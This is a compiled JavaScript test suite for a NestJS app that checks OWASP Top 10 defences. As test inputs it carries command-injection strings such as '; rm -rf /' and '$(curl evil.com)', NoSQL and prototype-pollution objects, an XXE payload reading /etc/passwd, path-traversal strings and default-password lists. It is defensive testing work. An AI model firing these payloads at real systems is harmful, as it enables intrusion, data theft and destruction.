"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const testing_1 = require("@nestjs/testing");
const request = require("supertest");
const app_module_1 = require("../../src/app.module");
const security_setup_1 = require("../setup/security-setup");
describe('OWASP Security Tests', () => {
    let app;
    let securityTestSuite;
    beforeAll(async () => {
        const moduleFixture = await testing_1.Test.createTestingModule({
            imports: [app_module_1.AppModule],
        }).compile();
        app = moduleFixture.createNestApplication();
        await app.init();
        securityTestSuite = new security_setup_1.SecurityTestSuite(app);
    });
    afterAll(async () => {
        await app.close();
    });
    describe('A01: Injection Attacks', () => {
        it('should prevent SQL injection in authentication', async () => {
            const sqlPayloads = security_setup_1.SecurityTestUtils.generateMaliciousPayloads().sqlInjection;
            for (const payload of sqlPayloads) {
                const response = await request(app.getHttpServer())
                    .post('/auth/login')
                    .send({ email: payload, password: 'test' })
                    .expect(400);
                expect(response.status).toBe(400);
                expect(response.body.message).not.toContain('SQL');
                expect(response.body.message).not.toContain('syntax');
            }
        });
        it('should prevent SQL injection in customer search', async () => {
            const sqlPayloads = security_setup_1.SecurityTestUtils.generateMaliciousPayloads().sqlInjection;
            for (const payload of sqlPayloads) {
                const response = await request(app.getHttpServer())
                    .get(`/api/customers/search?q=${encodeURIComponent(payload)}`)
                    .set('Authorization', 'Bearer valid-token')
                    .expect(400);
                expect(response.status).toBe(400);
            }
        });
        it('should prevent NoSQL injection', async () => {
            const nosqlPayloads = [
                { $where: "this.password == this.username" },
                { $ne: null },
                { $regex: ".*" },
                { $gt: "" }
            ];
            for (const payload of nosqlPayloads) {
                const response = await request(app.getHttpServer())
                    .post('/api/search')
                    .send(payload)
                    .set('Authorization', 'Bearer valid-token')
                    .expect(400);
                expect(response.status).toBe(400);
            }
        });
        it('should prevent command injection', async () => {
            const commandPayloads = [
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& whoami",
                "`id`",
                "$(curl evil.com)"
            ];
            for (const payload of commandPayloads) {
                const response = await request(app.getHttpServer())
                    .post('/api/export')
                    .send({ filename: payload })
                    .set('Authorization', 'Bearer valid-token')
                    .expect(400);
                expect(response.status).toBe(400);
            }
        });
    });
    describe('A02: Broken Authentication', () => {
        it('should prevent credential stuffing attacks', async () => {
            const commonPasswords = [
                'password', '123456', 'admin', 'qwerty', 'letmein',
                'welcome', 'monkey', 'dragon', 'master', 'hello'
            ];
            for (const password of commonPasswords) {
                const response = await request(app.getHttpServer())
                    .post('/auth/login')
                    .send({ email: 'test@example.com', password })
                    .expect(401);
                expect(response.status).toBe(401);
            }
        });
        it('should prevent session fixation attacks', async () => {
            const loginResponse = await request(app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'test@example.com', password: 'validpassword' })
                .expect(200);
            const sessionToken = loginResponse.body.access_token;
            const response = await request(app.getHttpServer())
                .get('/api/user/profile')
                .set('Authorization', `Bearer ${sessionToken}`)
                .expect(401);
            expect(response.status).toBe(401);
        });
        it('should enforce strong password policies', async () => {
            const weakPasswords = [
                '123', 'abc', 'password', 'qwerty', 'admin'
            ];
            for (const password of weakPasswords) {
                const response = await request(app.getHttpServer())
                    .post('/auth/register')
                    .send({
                    email: 'test@example.com',
                    password,
                    confirmPassword: password
                })
                    .expect(400);
                expect(response.status).toBe(400);
                expect(response.body.message).toContain('password');
            }
        });
        it('should implement proper session timeout', async () => {
            const loginResponse = await request(app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'test@example.com', password: 'validpassword' })
                .expect(200);
            const sessionToken = loginResponse.body.access_token;
            await new Promise(resolve => setTimeout(resolve, 1000));
            const response = await request(app.getHttpServer())
                .get('/api/user/profile')
                .set('Authorization', `Bearer ${sessionToken}`)
                .expect(401);
            expect(response.status).toBe(401);
        });
    });
    describe('A03: Sensitive Data Exposure', () => {
        it('should not expose passwords in responses', async () => {
            const response = await request(app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'test@example.com', password: 'testpassword' })
                .expect(200);
            const responseBody = JSON.stringify(response.body);
            expect(responseBody).not.toContain('password');
            expect(responseBody).not.toContain('testpassword');
        });
        it('should not expose credit card data in responses', async () => {
            const response = await request(app.getHttpServer())
                .post('/api/billing/payment')
                .send({
                cardNumber: '4111111111111111',
                expiryDate: '12/25',
                cvv: '123'
            })
                .set('Authorization', 'Bearer valid-token')
                .expect(200);
            const responseBody = JSON.stringify(response.body);
            expect(responseBody).not.toContain('4111111111111111');
            expect(responseBody).not.toContain('123');
        });
        it('should not expose SSN in responses', async () => {
            const response = await request(app.getHttpServer())
                .post('/api/customers')
                .send({
                first_name: 'John',
                last_name: 'Doe',
                email: 'john@example.com',
                ssn: '123-45-6789'
            })
                .set('Authorization', 'Bearer valid-token')
                .expect(201);
            const responseBody = JSON.stringify(response.body);
            expect(responseBody).not.toContain('123-45-6789');
        });
        it('should not expose API keys in responses', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/config')
                .set('Authorization', 'Bearer valid-token')
                .expect(200);
            const responseBody = JSON.stringify(response.body);
            expect(responseBody).not.toContain('api_key');
            expect(responseBody).not.toContain('secret');
        });
    });
    describe('A04: XML External Entities (XXE)', () => {
        it('should prevent XXE attacks', async () => {
            const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <foo>&xxe;</foo>`;
            const response = await request(app.getHttpServer())
                .post('/api/import')
                .set('Content-Type', 'application/xml')
                .send(xxePayload)
                .set('Authorization', 'Bearer valid-token')
                .expect(400);
            expect(response.status).toBe(400);
        });
        it('should prevent XXE in file uploads', async () => {
            const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
      <foo>&xxe;</foo>`;
            const response = await request(app.getHttpServer())
                .post('/api/upload')
                .attach('file', Buffer.from(xxePayload), 'test.xml')
                .set('Authorization', 'Bearer valid-token')
                .expect(400);
            expect(response.status).toBe(400);
        });
    });
    describe('A05: Broken Access Control', () => {
        it('should prevent unauthorized access to admin endpoints', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/admin/users')
                .expect(401);
            expect(response.status).toBe(401);
        });
        it('should prevent privilege escalation', async () => {
            const loginResponse = await request(app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'user@example.com', password: 'userpassword' })
                .expect(200);
            const userToken = loginResponse.body.access_token;
            const response = await request(app.getHttpServer())
                .get('/api/admin/users')
                .set('Authorization', `Bearer ${userToken}`)
                .expect(403);
            expect(response.status).toBe(403);
        });
        it('should prevent direct object references', async () => {
            const loginResponseA = await request(app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'usera@example.com', password: 'password' })
                .expect(200);
            const tokenA = loginResponseA.body.access_token;
            const response = await request(app.getHttpServer())
                .get('/api/customers/user-b-customer-id')
                .set('Authorization', `Bearer ${tokenA}`)
                .expect(403);
            expect(response.status).toBe(403);
        });
        it('should enforce tenant isolation', async () => {
            const loginResponseA = await request(app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'tenanta@example.com', password: 'password' })
                .expect(200);
            const tokenA = loginResponseA.body.access_token;
            const response = await request(app.getHttpServer())
                .get('/api/customers/tenant-b-customer-id')
                .set('Authorization', `Bearer ${tokenA}`)
                .expect(403);
            expect(response.status).toBe(403);
        });
    });
    describe('A06: Security Misconfiguration', () => {
        it('should have proper security headers', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/health')
                .expect(200);
            const headers = response.headers;
            expect(headers['x-content-type-options']).toBe('nosniff');
            expect(headers['x-frame-options']).toBe('DENY');
            expect(headers['x-xss-protection']).toBe('1; mode=block');
            expect(headers['strict-transport-security']).toBeDefined();
            expect(headers['content-security-policy']).toBeDefined();
        });
        it('should not expose sensitive information in error messages', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/nonexistent')
                .expect(404);
            const responseBody = JSON.stringify(response.body);
            expect(responseBody).not.toContain('stack');
            expect(responseBody).not.toContain('error');
            expect(responseBody).not.toContain('trace');
        });
        it('should not have debug mode enabled in production', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/debug')
                .expect(404);
            expect(response.status).toBe(404);
        });
        it('should not use default credentials', async () => {
            const defaultCredentials = [
                { username: 'admin', password: 'admin' },
                { username: 'administrator', password: 'password' },
                { username: 'root', password: 'root' },
                { username: 'user', password: 'user' }
            ];
            for (const creds of defaultCredentials) {
                const response = await request(app.getHttpServer())
                    .post('/auth/login')
                    .send({ email: creds.username, password: creds.password })
                    .expect(401);
                expect(response.status).toBe(401);
            }
        });
    });
    describe('A07: Cross-Site Scripting (XSS)', () => {
        it('should prevent stored XSS attacks', async () => {
            const xssPayloads = security_setup_1.SecurityTestUtils.generateMaliciousPayloads().xssPayloads;
            for (const payload of xssPayloads) {
                const response = await request(app.getHttpServer())
                    .post('/api/customers')
                    .send({
                    first_name: payload,
                    last_name: 'Test',
                    email: 'test@example.com'
                })
                    .set('Authorization', 'Bearer valid-token')
                    .expect(400);
                expect(response.status).toBe(400);
            }
        });
        it('should prevent reflected XSS attacks', async () => {
            const xssPayloads = security_setup_1.SecurityTestUtils.generateMaliciousPayloads().xssPayloads;
            for (const payload of xssPayloads) {
                const response = await request(app.getHttpServer())
                    .get(`/api/search?q=${encodeURIComponent(payload)}`)
                    .set('Authorization', 'Bearer valid-token')
                    .expect(400);
                expect(response.status).toBe(400);
            }
        });
        it('should prevent DOM-based XSS attacks', async () => {
            const xssPayloads = security_setup_1.SecurityTestUtils.generateMaliciousPayloads().xssPayloads;
            for (const payload of xssPayloads) {
                const response = await request(app.getHttpServer())
                    .get(`/api/redirect?url=${encodeURIComponent(payload)}`)
                    .set('Authorization', 'Bearer valid-token')
                    .expect(400);
                expect(response.status).toBe(400);
            }
        });
    });
    describe('A08: Insecure Deserialization', () => {
        it('should prevent insecure deserialization attacks', async () => {
            const maliciousPayload = {
                __proto__: {
                    isAdmin: true
                }
            };
            const response = await request(app.getHttpServer())
                .post('/api/deserialize')
                .send(maliciousPayload)
                .set('Authorization', 'Bearer valid-token')
                .expect(400);
            expect(response.status).toBe(400);
        });
        it('should validate deserialized data', async () => {
            const invalidPayload = {
                type: 'User',
                data: 'invalid-serialized-data'
            };
            const response = await request(app.getHttpServer())
                .post('/api/deserialize')
                .send(invalidPayload)
                .set('Authorization', 'Bearer valid-token')
                .expect(400);
            expect(response.status).toBe(400);
        });
    });
    describe('A09: Using Components with Known Vulnerabilities', () => {
        it('should not expose vulnerable components', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/version')
                .expect(200);
            const versionInfo = response.body;
            expect(versionInfo).not.toContain('vulnerable');
            expect(versionInfo).not.toContain('exploit');
        });
        it('should have up-to-date dependencies', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/health')
                .expect(200);
            expect(response.status).toBe(200);
        });
    });
    describe('A10: Insufficient Logging & Monitoring', () => {
        it('should log security events', async () => {
            const response = await request(app.getHttpServer())
                .post('/auth/login')
                .send({ email: 'hacker@evil.com', password: 'wrongpassword' })
                .expect(401);
            expect(response.status).toBe(401);
        });
        it('should log access attempts', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/admin/users')
                .expect(401);
            expect(response.status).toBe(401);
        });
        it('should log data modification attempts', async () => {
            const response = await request(app.getHttpServer())
                .put('/api/customers/123')
                .send({ first_name: 'Hacked' })
                .expect(401);
            expect(response.status).toBe(401);
        });
    });
    describe('Additional Security Tests', () => {
        it('should prevent path traversal attacks', async () => {
            const pathPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ];
            for (const payload of pathPayloads) {
                const response = await request(app.getHttpServer())
                    .get(`/api/files/${payload}`)
                    .set('Authorization', 'Bearer valid-token')
                    .expect(400);
                expect(response.status).toBe(400);
            }
        });
        it('should prevent CSRF attacks', async () => {
            const response = await request(app.getHttpServer())
                .post('/api/customers')
                .send({ first_name: 'Test', last_name: 'User' })
                .expect(403);
            expect(response.status).toBe(403);
        });
        it('should prevent clickjacking attacks', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/dashboard')
                .set('Authorization', 'Bearer valid-token')
                .expect(200);
            const frameOptions = response.headers['x-frame-options'];
            expect(frameOptions).toBe('DENY');
        });
        it('should prevent information disclosure', async () => {
            const response = await request(app.getHttpServer())
                .get('/api/error')
                .expect(500);
            const responseBody = JSON.stringify(response.body);
            expect(responseBody).not.toContain('stack');
            expect(responseBody).not.toContain('trace');
            expect(responseBody).not.toContain('error');
        });
    });
});
//# sourceMappingURL=owasp-security.test.js.map